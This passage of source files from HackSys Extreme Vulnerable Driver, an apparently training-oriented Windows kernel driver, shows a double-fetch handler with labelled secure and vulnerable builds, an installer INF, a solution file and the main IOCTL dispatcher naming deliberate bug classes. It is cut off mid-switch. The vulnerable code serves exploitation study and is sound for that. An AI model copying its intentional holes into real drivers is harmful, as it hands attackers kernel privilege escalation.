    ULONG KernelBuffer[BUFFER_SIZE] = { 0 };

#ifdef SECURE
    SIZE_T UserBufferSize = 0;
#endif

    PAGED_CODE();

    __try
    {
        //
        // Verify if the buffer resides in user mode
        //

        ProbeForRead(UserDoubleFetch, sizeof(DOUBLE_FETCH), (ULONG)__alignof(UCHAR));

        DbgPrint("[+] UserDoubleFetch: 0x%p\n", UserDoubleFetch);
        DbgPrint("[+] KernelBuffer: 0x%p\n", &KernelBuffer);
        DbgPrint("[+] KernelBuffer Size: 0x%zX\n", sizeof(KernelBuffer));

#ifdef SECURE
        UserBuffer = UserDoubleFetch->Buffer;
        UserBufferSize = UserDoubleFetch->Size;

        //
        // Verify if the 'UserDoubleFetch->Buffer' resides in user mode
        //

        ProbeForRead(UserBuffer, sizeof(KernelBuffer), (ULONG)__alignof(UCHAR));

        DbgPrint("[+] UserDoubleFetch->Buffer: 0x%p\n", UserBuffer);
        DbgPrint("[+] UserDoubleFetch->Size: 0x%zX\n", UserBufferSize);

        if (UserBufferSize > sizeof(KernelBuffer))
        {
            DbgPrint("[-] Invalid Buffer Size: 0x%zX\n", UserBufferSize);

            Status = STATUS_INVALID_PARAMETER;
            return Status;
        }

        //
        // Secure Note: This is secure because the developer is fetching
        // 'UserDoubleFetch->Buffer' and 'UserDoubleFetch->Size' from user
        // mode just once and storing it in a temporary variable. Later, this
        // stored values are passed to RtlCopyMemory()/memcpy(). Hence, there
        // will be no race condition
        //

        RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, UserBufferSize);
#else
        UserBuffer = UserDoubleFetch->Buffer;
        DbgPrint("[+] UserDoubleFetch->Buffer: 0x%p\n", UserBuffer);
        DbgPrint("[+] UserDoubleFetch->Size: 0x%zX\n", UserDoubleFetch->Size);

        //
        // Verify if the 'UserDoubleFetch->Buffer' resides in user mode
        //

        ProbeForRead(UserBuffer, sizeof(KernelBuffer), (ULONG)__alignof(UCHAR));

        if (UserDoubleFetch->Size > sizeof(KernelBuffer))
        {
            DbgPrint("[-] Invalid Buffer Size: 0x%zX\n", UserDoubleFetch->Size);

            Status = STATUS_INVALID_PARAMETER;
            return Status;
        }

        DbgPrint("[+] Triggering Double Fetch\n");

        //
        // Vulnerability Note: This is a vanilla Double Fetch vulnerability because the
        // developer is fetching 'UserDoubleFetch->Size' from user mode twice and the 
        // double fetched values are passed to RtlCopyMemory()/memcpy().
        // This creates a race condition and the size check could be bypassed which will later
        // cause stack based buffer overflow
        //

        RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, UserDoubleFetch->Size);
#endif
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        Status = GetExceptionCode();
        DbgPrint("[-] Exception Code: 0x%X\n", Status);
    }

    return Status;
}


/// <summary>
/// Double Fetch Ioctl Handler
/// </summary>
/// <param name="Irp">The pointer to IRP</param>
/// <param name="IrpSp">The pointer to IO_STACK_LOCATION structure</param>
/// <returns>NTSTATUS</returns>
NTSTATUS
DoubleFetchIoctlHandler(
    _In_ PIRP Irp,
    _In_ PIO_STACK_LOCATION IrpSp
)
{
    PDOUBLE_FETCH UserDoubleFetch = NULL;
    NTSTATUS Status = STATUS_UNSUCCESSFUL;

    UNREFERENCED_PARAMETER(Irp);
    PAGED_CODE();

    UserDoubleFetch = (PDOUBLE_FETCH)IrpSp->Parameters.DeviceIoControl.Type3InputBuffer;

    if (UserDoubleFetch)
    {
        Status = TriggerDoubleFetch(UserDoubleFetch);
    }

    return Status;
}

```

`Driver/HEVD/Windows/DoubleFetch.h`:

```h
/*++

          ##     ## ######## ##     ## ########
          ##     ## ##       ##     ## ##     ##
          ##     ## ##       ##     ## ##     ##
          ######### ######   ##     ## ##     ##
          ##     ## ##        ##   ##  ##     ##
          ##     ## ##         ## ##   ##     ##
          ##     ## ########    ###    ########

            HackSys Extreme Vulnerable Driver

Author : Ashfaq Ansari
Contact: ashfaq[at]hacksys[dot]io
Website: https://hacksys.io/

Copyright (C) 2021-2023 HackSys Inc. All rights reserved.
Copyright (C) 2015-2020 Payatu Software Labs LLP. All rights reserved.

This program is free software: you can redistribute it and/or modify it under the terms of
the GNU General Public License as published by the Free Software Foundation, either version
3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.
If not, see <http://www.gnu.org/licenses/>.

THIS SOFTWARE IS PROVIDED "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY DIRECT,
INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

See the file 'LICENSE' for complete copying permission.

Module Name:
    DoubleFetch.h

Abstract:
    This module implements the data structures for
    double fetch module.

--*/

#pragma once

#ifndef __DOUBLE_FETCH_H__
#define __DOUBLE_FETCH_H__

#include "Common.h"


//
// Structures
//

typedef struct _DOUBLE_FETCH
{
    PVOID Buffer;
    SIZE_T Size;
} DOUBLE_FETCH, *PDOUBLE_FETCH;


//
// Function Definitions
//

NTSTATUS
TriggerDoubleFetch(
    _In_ PDOUBLE_FETCH UserDoubleFetch
);

#endif  // !__DOUBLE_FETCH_H__

```

`Driver/HEVD/Windows/HEVD.inf`:

```inf
;
; HEVD.inf
;

[Version]
Signature   = "$WINDOWS NT$"
Class       = System
ClassGuid   = {4d36e97d-e325-11ce-bfc1-08002be10318}
Provider    = %ManufacturerName%
CatalogFile = HEVD.cat
DriverVer   = 

[DestinationDirs]
DefaultDestDir = 10           ; %SystemRoot%

[SourceDisksNames]
1 = %DiskName%,,,""

[SourceDisksFiles]
HEVD.sys = 1,,

;*****************************************
; HEVD driver install sections
;*****************************************

[DefaultInstall]
OptionDesc = %ServiceDesc%
CopyFiles  = HEVD.DriverFiles

[HEVD.DriverFiles]
HEVD.sys,,,0x00000004        ; COPYFLG_NOVERSIONCHECK

;*****************************************
; HEVD service install sections
;*****************************************

[DefaultInstall.Services]
AddService = %ServiceName%,,HEVD.ServiceInstall

[HEVD.ServiceInstall]
DisplayName   = %ServiceName%
Description   = %ServiceDesc%
ServiceBinary = %10%\HEVD.sys
ServiceType   = 1              ; SERVICE_KERNEL_DRIVER
StartType     = 3              ; SERVICE_AUTO_START ; SERVICE_DEMAND_START = 3
ErrorControl  = 1              ; SERVICE_ERROR_NORMAL

;*****************************************
; Strings Section
;*****************************************

[Strings]
ManufacturerName = "HackSys Team"
DiskName         = "HEVD Installation Disk"
ServiceName      = "HEVD"
ServiceDesc      = "HackSys Extreme Vulnerable Driver Service"

```

`Driver/HEVD/Windows/HEVD.sln`:

```sln

Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio 15
VisualStudioVersion = 15.0.28010.2003
MinimumVisualStudioVersion = 10.0.40219.1
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "HackSysExtremeVulnerableDriver", "HackSysExtremeVulnerableDriver.vcxproj", "{7C47CF49-817B-452A-8B81-9450F9EF89CA}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug Secure|ARM = Debug Secure|ARM
		Debug Secure|ARM64 = Debug Secure|ARM64
		Debug Secure|x64 = Debug Secure|x64
		Debug Secure|x86 = Debug Secure|x86
		Debug Vulnerable|ARM = Debug Vulnerable|ARM
		Debug Vulnerable|ARM64 = Debug Vulnerable|ARM64
		Debug Vulnerable|x64 = Debug Vulnerable|x64
		Debug Vulnerable|x86 = Debug Vulnerable|x86
		Release Secure|ARM = Release Secure|ARM
		Release Secure|ARM64 = Release Secure|ARM64
		Release Secure|x64 = Release Secure|x64
		Release Secure|x86 = Release Secure|x86
		Release Vulnerable|ARM = Release Vulnerable|ARM
		Release Vulnerable|ARM64 = Release Vulnerable|ARM64
		Release Vulnerable|x64 = Release Vulnerable|x64
		Release Vulnerable|x86 = Release Vulnerable|x86
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{7C47CF49-817B-452A-8B81-9450F9EF89CA}.Debug Secure|ARM.ActiveCfg = Debug Secure|ARM
		{7C47CF49-817B-452A-8B81-9450F9EF89CA}.Debug Secure|ARM.Build.0 = Debug Secure|ARM
		{7C47CF49-817B-452A-8B81-9450F9EF89CA}.Debug Secure|ARM.Deploy.0 = Debug Secure|ARM
		{7C47CF49-817B-452A-8B81-9450F9EF89CA}.Debug Secure|ARM64.ActiveCfg = Debug Secure|ARM64
		{7C47CF49-817B-452A-8B81-9450F9EF89CA}.Debug Secure|ARM64.Build.0 = Debug Secure|ARM64
		{7C47CF49-817B-452A-8B81-9450F9EF89CA}.Debug Secure|ARM64.Deploy.0 = Debug Secure|ARM64
		{7C47CF49-817B-452A-8B81-9450F9EF89CA}.Debug Secure|x64.ActiveCfg = Debug Secure|x64
		{7C47CF49-817B-452A-8B81-9450F9EF89CA}.Debug Secure|x64.Build.0 = Debug Secure|x64
		{7C47CF49-817B-452A-8B81-9450F9EF89CA}.Debug Secure|x64.Deploy.0 = Debug Secure|x64
		{7C47CF49-817B-452A-8B81-9450F9EF89CA}.Debug Secure|x86.ActiveCfg = Debug Secure|Win32
		{7C47CF49-817B-452A-8B81-9450F9EF89CA}.Debug Secure|x86.Build.0 = Debug Secure|Win32
		{7C47CF49-817B-452A-8B81-9450F9EF89CA}.Debug Secure|x86.Deploy.0 = Debug Secure|Win32
		{7C47CF49-817B-452A-8B81-9450F9EF89CA}.Debug Vulnerable|ARM.ActiveCfg = Debug Vulnerable|ARM
		{7C47CF49-817B-452A-8B81-9450F9EF89CA}.Debug Vulnerable|ARM.Build.0 = Debug Vulnerable|ARM
		{7C47CF49-817B-452A-8B81-9450F9EF89CA}.Debug Vulnerable|ARM.Deploy.0 = Debug Vulnerable|ARM
		{7C47CF49-817B-452A-8B81-9450F9EF89CA}.Debug Vulnerable|ARM64.ActiveCfg = Debug Vulnerable|ARM64
		{7C47CF49-817B-452A-8B81-9450F9EF89CA}.Debug Vulnerable|ARM64.Build.0 = Debug Vulnerable|ARM64
		{7C47CF49-817B-452A-8B81-9450F9EF89CA}.Debug Vulnerable|ARM64.Deploy.0 = Debug Vulnerable|ARM64
		{7C47CF49-817B-452A-8B81-9450F9EF89CA}.Debug Vulnerable|x64.ActiveCfg = Debug Vulnerable|x64
		{7C47CF49-817B-452A-8B81-9450F9EF89CA}.Debug Vulnerable|x64.Build.0 = Debug Vulnerable|x64
		{7C47CF49-817B-452A-8B81-9450F9EF89CA}.Debug Vulnerable|x64.Deploy.0 = Debug Vulnerable|x64
		{7C47CF49-817B-452A-8B81-9450F9EF89CA}.Debug Vulnerable|x86.ActiveCfg = Debug Vulnerable|Win32
		{7C47CF49-817B-452A-8B81-9450F9EF89CA}.Debug Vulnerable|x86.Build.0 = Debug Vulnerable|Win32
		{7C47CF49-817B-452A-8B81-9450F9EF89CA}.Debug Vulnerable|x86.Deploy.0 = Debug Vulnerable|Win32
		{7C47CF49-817B-452A-8B81-9450F9EF89CA}.Release Secure|ARM.ActiveCfg = Release Secure|ARM
		{7C47CF49-817B-452A-8B81-9450F9EF89CA}.Release Secure|ARM.Build.0 = Release Secure|ARM
		{7C47CF49-817B-452A-8B81-9450F9EF89CA}.Release Secure|ARM.Deploy.0 = Release Secure|ARM
		{7C47CF49-817B-452A-8B81-9450F9EF89CA}.Release Secure|ARM64.ActiveCfg = Release Secure|ARM64
		{7C47CF49-817B-452A-8B81-9450F9EF89CA}.Release Secure|ARM64.Build.0 = Release Secure|ARM64
		{7C47CF49-817B-452A-8B81-9450F9EF89CA}.Release Secure|ARM64.Deploy.0 = Release Secure|ARM64
		{7C47CF49-817B-452A-8B81-9450F9EF89CA}.Release Secure|x64.ActiveCfg = Release Secure|x64
		{7C47CF49-817B-452A-8B81-9450F9EF89CA}.Release Secure|x64.Build.0 = Release Secure|x64
		{7C47CF49-817B-452A-8B81-9450F9EF89CA}.Release Secure|x64.Deploy.0 = Release Secure|x64
		{7C47CF49-817B-452A-8B81-9450F9EF89CA}.Release Secure|x86.ActiveCfg = Release Secure|Win32
		{7C47CF49-817B-452A-8B81-9450F9EF89CA}.Release Secure|x86.Build.0 = Release Secure|Win32
		{7C47CF49-817B-452A-8B81-9450F9EF89CA}.Release Secure|x86.Deploy.0 = Release Secure|Win32
		{7C47CF49-817B-452A-8B81-9450F9EF89CA}.Release Vulnerable|ARM.ActiveCfg = Release Vulnerable|ARM
		{7C47CF49-817B-452A-8B81-9450F9EF89CA}.Release Vulnerable|ARM.Build.0 = Release Vulnerable|ARM
		{7C47CF49-817B-452A-8B81-9450F9EF89CA}.Release Vulnerable|ARM.Deploy.0 = Release Vulnerable|ARM
		{7C47CF49-817B-452A-8B81-9450F9EF89CA}.Release Vulnerable|ARM64.ActiveCfg = Release Vulnerable|ARM64
		{7C47CF49-817B-452A-8B81-9450F9EF89CA}.Release Vulnerable|ARM64.Build.0 = Release Vulnerable|ARM64
		{7C47CF49-817B-452A-8B81-9450F9EF89CA}.Release Vulnerable|ARM64.Deploy.0 = Release Vulnerable|ARM64
		{7C47CF49-817B-452A-8B81-9450F9EF89CA}.Release Vulnerable|x64.ActiveCfg = Release Vulnerable|x64
		{7C47CF49-817B-452A-8B81-9450F9EF89CA}.Release Vulnerable|x64.Build.0 = Release Vulnerable|x64
		{7C47CF49-817B-452A-8B81-9450F9EF89CA}.Release Vulnerable|x64.Deploy.0 = Release Vulnerable|x64
		{7C47CF49-817B-452A-8B81-9450F9EF89CA}.Release Vulnerable|x86.ActiveCfg = Release Vulnerable|Win32
		{7C47CF49-817B-452A-8B81-9450F9EF89CA}.Release Vulnerable|x86.Build.0 = Release Vulnerable|Win32
		{7C47CF49-817B-452A-8B81-9450F9EF89CA}.Release Vulnerable|x86.Deploy.0 = Release Vulnerable|Win32
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
	GlobalSection(ExtensibilityGlobals) = postSolution
		SolutionGuid = {FF217736-87A5-4A22-B22A-F72D9FB2B477}
	EndGlobalSection
EndGlobal

```

`Driver/HEVD/Windows/HackSysExtremeVulnerableDriver.c`:

```c
/*++

          ##     ## ######## ##     ## ########
          ##     ## ##       ##     ## ##     ##
          ##     ## ##       ##     ## ##     ##
          ######### ######   ##     ## ##     ##
          ##     ## ##        ##   ##  ##     ##
          ##     ## ##         ## ##   ##     ##
          ##     ## ########    ###    ########

            HackSys Extreme Vulnerable Driver

Author : Ashfaq Ansari
Contact: ashfaq[at]hacksys[dot]io
Website: https://hacksys.io/

Copyright (C) 2021-2023 HackSys Inc. All rights reserved.
Copyright (C) 2015-2020 Payatu Software Labs LLP. All rights reserved.

This program is free software: you can redistribute it and/or modify it under the terms of
the GNU General Public License as published by the Free Software Foundation, either version
3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.
If not, see <http://www.gnu.org/licenses/>.

THIS SOFTWARE IS PROVIDED "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY DIRECT,
INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

See the file 'LICENSE' for complete copying permission.

Module Name:
    HackSysExtremeVulnerableDriver.c

Abstract:
    This module implements the main kernel driver
    of HackSys Extreme Vulnerable Driver.

--*/

#include "HackSysExtremeVulnerableDriver.h"

#ifdef ALLOC_PRAGMA
#pragma alloc_text(INIT, DriverEntry)
#pragma alloc_text(PAGE, DriverUnloadHandler)
#pragma alloc_text(PAGE, IrpCreateCloseHandler)
#pragma alloc_text(PAGE, IrpDeviceIoCtlHandler)
#pragma alloc_text(PAGE, IrpNotImplementedHandler)
#endif // ALLOC_PRAGMA


/// <summary>
/// HackSys Extreme Vulnerable Driver Entry Point
/// </summary>
/// <param name="DriverObject">The pointer to DRIVER_OBJECT</param>
/// <param name="RegistryPath">The pointer to Unicode string specifying registry path</param>
/// <returns>NTSTATUS</returns>
NTSTATUS
DriverEntry(
    _In_ PDRIVER_OBJECT DriverObject,
    _In_ PUNICODE_STRING RegistryPath
)
{
    UINT32 i = 0;
    PDEVICE_OBJECT DeviceObject = NULL;
    NTSTATUS Status = STATUS_UNSUCCESSFUL;
    UNICODE_STRING DeviceName, DosDeviceName = { 0 };

    UNREFERENCED_PARAMETER(RegistryPath);
    PAGED_CODE();

    RtlInitUnicodeString(&DeviceName, L"\\Device\\HackSysExtremeVulnerableDriver");
    RtlInitUnicodeString(&DosDeviceName, L"\\DosDevices\\HackSysExtremeVulnerableDriver");

    //
    // Create the device
    //

    Status = IoCreateDevice(
        DriverObject,
        0,
        &DeviceName,
        FILE_DEVICE_UNKNOWN,
        FILE_DEVICE_SECURE_OPEN,
        FALSE,
        &DeviceObject
    );

    if (!NT_SUCCESS(Status))
    {
        if (DeviceObject)
        {
            //
            // Delete the device
            //

            IoDeleteDevice(DeviceObject);
        }

        DbgPrint("[-] Error Initializing HackSys Extreme Vulnerable Driver\n");
        return Status;
    }

    //
    // Assign the IRP handlers
    //

    for (i = 0; i <= IRP_MJ_MAXIMUM_FUNCTION; i++)
    {
        DriverObject->MajorFunction[i] = IrpNotImplementedHandler;
    }

    //
    // Assign the IRP handlers for Create, Close and Device Control
    //

    DriverObject->MajorFunction[IRP_MJ_CREATE] = IrpCreateCloseHandler;
    DriverObject->MajorFunction[IRP_MJ_CLOSE] = IrpCreateCloseHandler;
    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = IrpDeviceIoCtlHandler;

    //
    // Assign the driver Unload routine
    //

    DriverObject->DriverUnload = DriverUnloadHandler;

    //
    // Set the flags
    //

    DeviceObject->Flags |= DO_DIRECT_IO;
    DeviceObject->Flags &= ~DO_DEVICE_INITIALIZING;

    //
    // Create the symbolic link
    //

    Status = IoCreateSymbolicLink(&DosDeviceName, &DeviceName);

    //
    // Show the banner
    //

    DbgPrint("%s", BANNER);
    DbgPrint("[+] HackSys Extreme Vulnerable Driver Loaded\n");

    return Status;
}


/// <summary>
/// IRP Create Close Handler
/// </summary>
/// <param name="DeviceObject">The pointer to DEVICE_OBJECT</param>
/// <param name="Irp">The pointer to IRP</param>
/// <returns>NTSTATUS</returns>
NTSTATUS
IrpCreateCloseHandler(
    _In_ PDEVICE_OBJECT DeviceObject,
    _Inout_ PIRP Irp
)
{
    Irp->IoStatus.Information = 0;
    Irp->IoStatus.Status = STATUS_SUCCESS;

    UNREFERENCED_PARAMETER(DeviceObject);
    PAGED_CODE();

    //
    // Complete the request
    //

    IoCompleteRequest(Irp, IO_NO_INCREMENT);

    return STATUS_SUCCESS;
}


/// <summary>
/// Driver Unload Handler
/// </summary>
/// <param name="DeviceObject">The pointer to DEVICE_OBJECT</param>
/// <returns>NTSTATUS</returns>
VOID
DriverUnloadHandler(
    _In_ PDRIVER_OBJECT DriverObject
)
{
    UNICODE_STRING DosDeviceName = { 0 };

    PAGED_CODE();

    RtlInitUnicodeString(&DosDeviceName, L"\\DosDevices\\HackSysExtremeVulnerableDriver");

    //
    // Delete the symbolic link
    //

    IoDeleteSymbolicLink(&DosDeviceName);

    //
    // Delete the device
    //

    IoDeleteDevice(DriverObject->DeviceObject);

    DbgPrint("[-] HackSys Extreme Vulnerable Driver Unloaded\n");
}


/// <summary>
/// IRP Not Implemented Handler
/// </summary>
/// <param name="DeviceObject">The pointer to DEVICE_OBJECT</param>
/// <param name="Irp">The pointer to IRP</param>
/// <returns>NTSTATUS</returns>
NTSTATUS
IrpNotImplementedHandler(
    _In_ PDEVICE_OBJECT DeviceObject,
    _Inout_ PIRP Irp
)
{
    Irp->IoStatus.Information = 0;
    Irp->IoStatus.Status = STATUS_NOT_SUPPORTED;

    UNREFERENCED_PARAMETER(DeviceObject);
    PAGED_CODE();

    //
    // Complete the request
    //

    IoCompleteRequest(Irp, IO_NO_INCREMENT);

    return STATUS_NOT_SUPPORTED;
}


/// <summary>
/// IRP Device IoCtl Handler
/// </summary>
/// <param name="DeviceObject">The pointer to DEVICE_OBJECT</param>
/// <param name="Irp">The pointer to IRP</param>
/// <returns>NTSTATUS</returns>
NTSTATUS
IrpDeviceIoCtlHandler(
    _In_ PDEVICE_OBJECT DeviceObject,
    _Inout_ PIRP Irp
)
{
    ULONG IoControlCode = 0;
    PIO_STACK_LOCATION IrpSp = NULL;
    NTSTATUS Status = STATUS_NOT_SUPPORTED;

    UNREFERENCED_PARAMETER(DeviceObject);
    PAGED_CODE();

    IrpSp = IoGetCurrentIrpStackLocation(Irp);

    if (IrpSp)
    {
        IoControlCode = IrpSp->Parameters.DeviceIoControl.IoControlCode;

        switch (IoControlCode)
        {
        case HEVD_IOCTL_BUFFER_OVERFLOW_STACK:
            DbgPrint("****** HEVD_IOCTL_BUFFER_OVERFLOW_STACK ******\n");
            Status = BufferOverflowStackIoctlHandler(Irp, IrpSp);
            DbgPrint("****** HEVD_IOCTL_BUFFER_OVERFLOW_STACK ******\n");
            break;
        case HEVD_IOCTL_BUFFER_OVERFLOW_STACK_GS:
            DbgPrint("****** HEVD_IOCTL_BUFFER_OVERFLOW_STACK_GS ******\n");
            Status = BufferOverflowStackGSIoctlHandler(Irp, IrpSp);
            DbgPrint("****** HEVD_IOCTL_BUFFER_OVERFLOW_STACK_GS ******\n");
            break;
        case HEVD_IOCTL_ARBITRARY_WRITE:
            DbgPrint("****** HEVD_IOCTL_ARBITRARY_WRITE ******\n");
            Status = ArbitraryWriteIoctlHandler(Irp, IrpSp);
            DbgPrint("****** HEVD_IOCTL_ARBITRARY_WRITE ******\n");
            break;
        case HEVD_IOCTL_BUFFER_OVERFLOW_NON_PAGED_POOL:
            DbgPrint("****** HEVD_IOCTL_BUFFER_OVERFLOW_NON_PAGED_POOL ******\n");
            Status = BufferOverflowNonPagedPoolIoctlHandler(Irp, IrpSp);
            DbgPrint("****** HEVD_IOCTL_BUFFER_OVERFLOW_NON_PAGED_POOL ******\n");
            break;
        case HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL:
            DbgPrint("****** HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL ******\n");
            Status = AllocateUaFObjectNonPagedPoolIoctlHandler(Irp, IrpSp);
            DbgPrint("****** HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL ******\n");
            break;
        case HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL:
            DbgPrint("****** HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL ******\n");
            Status = UseUaFObjectNonPagedPoolIoctlHandler(Irp, IrpSp);
            DbgPrint("****** HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL ******\n");
            break;
        case HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL:
            DbgPrint("****** HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL ******\n");
            Status = FreeUaFObjectNonPagedPoolIoctlHandler(Irp, IrpSp);
            DbgPrint("****** HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL ******\n");
            break;
        case HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED_POOL:
            DbgPrint("****** HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED_POOL ******\n");
            Status = AllocateFakeObjectNonPagedPoolIoctlHandler(Irp, IrpSp);
            DbgPrint("****** HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED_POOL ******\n");
            break;
        case HEVD_IOCTL_TYPE_CONFUSION:
            DbgPrint("****** HEVD_IOCTL_TYPE_CONFUSION ******\n");
            Status = TypeConfusionIoctlHandler(Irp, IrpSp);
            DbgPrint("****** HEVD_IOCTL_TYPE_CONFUSION ******\n");
            break;
        case HEVD_IOCTL_INTEGER_OVERFLOW:
            DbgPrint("****** HEVD_IOCTL_INTEGER_OVERFLOW ******\n");
            Status = IntegerOverflowIoctlHandler(Irp, IrpSp);
            DbgPrint("****** HEVD_IOCTL_INTEGER_OVERFLOW ******\n");
            break;
        case HEVD_IOCTL_NULL_POINTER_DEREFERENCE:
            DbgPrint("****** HEVD_IOCTL_NULL_POINTER_DEREFERENCE ******\n");
            Status = NullPointerDereferenceIoctlHandler(Irp, IrpSp);
            DbgPrint("****** HEVD_IOCTL_NULL_POINTER_DEREFERENCE ******\n");
            break;
        case HEVD_IOCTL_UNINITIALIZED_MEMORY_STACK:
            DbgPrint("****** HEVD_IOCTL_UNINITIALIZED_MEMORY_STACK ******\n");
            Status = UninitializedMemoryStackIoctlHandler(Irp, IrpSp);
            DbgPrint("****** HEVD_IOCTL_UNINITIALIZED_MEMORY_STACK ******\n");
            break;
        case HEVD_IOCTL_UNINITIALIZED_MEMORY_PAGED_POOL:
            DbgPrint("****** HEVD_IOCTL_UNINITIALIZED_MEMORY_PAGED_POOL ******\n");
            Status = UninitializedMemoryPagedPoolIoctlHandler(Irp, IrpSp);
            DbgPrint("****** HEVD_IOCTL_UNINITIALIZED_MEMORY_PAGED_POOL ******\n");
            break;
        case HEVD_IOCTL_DOUBLE_FETCH:
            DbgPrint("****** HEVD_IOCTL_DOUBLE_FETCH ******\n");
            Status = DoubleFetchIoctlHandler(Irp, IrpSp);
            DbgPrint("****** HEVD_IOCTL_DOUBLE_FETCH ******\n");
            break;
        case HEVD_IOCTL_INSECURE_KERNEL_FILE_ACCESS:
            DbgPrint("****** HEVD_IOCTL_INSECURE_KERNEL_FILE_ACCESS ******\n");
            Status = InsecureKernelFileAccessIoctlHandler(Irp, IrpSp);
            DbgPrint("****** HEVD_IOCTL_INSECURE_KERNEL_FILE_ACCESS ******\n");
            break;
        case HEVD_IOCTL_MEMORY_DISCLOSURE_NON_PAGED_POOL:
            DbgPrint("****** HEVD_IOCTL_MEMORY_DISCLOSURE_NON_PAGED_POOL ******\n");
            Status = MemoryDisclosureNonPagedPoolIoctlHandler(Irp, IrpSp);
            DbgPrint("****** HEVD_IOCTL_MEMORY_DISCLOSURE_NON_PAGED_POOL ******\n");
            break;
        case HEVD_IOCTL_BUFFER_OVERFLOW_PAGED_POOL_SESSION:
            DbgPrint("****** HEVD_IOCTL_BUFFER_OVERFLOW_PAGED_POOL_SESSION ******\n");
            Status = BufferOverflowPagedPoolSessionIoctlHandler(Irp, IrpSp);
            DbgPrint("****** HEVD_IOCTL_BUFFER_OVERFLOW_PAGED_POOL_SESSION ******\n");
            break;
        case HEVD_IOCTL_WRITE_NULL:
            DbgPrint("****** HEVD_IOCTL_WRITE_NULL ******\n");
            Status = WriteNULLIoctlHandler(Irp, IrpSp);
            DbgPrint("****** HEVD_IOCTL_WRITE_NULL ******\n");
            break;
        case HEVD_IOCTL_BUFFER_OVERFLOW_NON_PAGED_POOL_NX:
            DbgPrint("****** HEVD_IOCTL_BUFFER_OVERFLOW_NON_PAGED_POOL_NX ******\n");
            Status = BufferOverflowNonPagedPoolNxIoctlHandler(Irp, IrpSp);
            DbgPrint("****** HEVD_IOCTL_BUFFER_OVERFLOW_NON_PAGED_POOL_NX ******\n");
            break;
        case HEVD_IOCTL_MEMORY_DISCLOSURE_NON_PAGED_POOL_NX:
            DbgPrint("****** HEVD_IOCTL_MEMORY_DISCLOSURE_NON_PAGED_POOL_NX ******\n");
            Status = MemoryDisclosureNonPagedPoolNxIoctlHandler(Irp, IrpSp);
            DbgPrint("****** HEVD_IOCTL_MEMORY_DISCLOSURE_NON_PAGED_POOL_NX ******\n");
            break;
        case HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL_NX:
            DbgPrint("****** HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL_NX ******\n");
            Status = AllocateUaFObjectNonPagedPoolNxIoctlHandler(Irp, IrpSp);
            DbgPrint("****** HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL_NX ******\n");
            break;
        case HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL_NX:
            DbgPrint("****** HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL_NX ******\n");
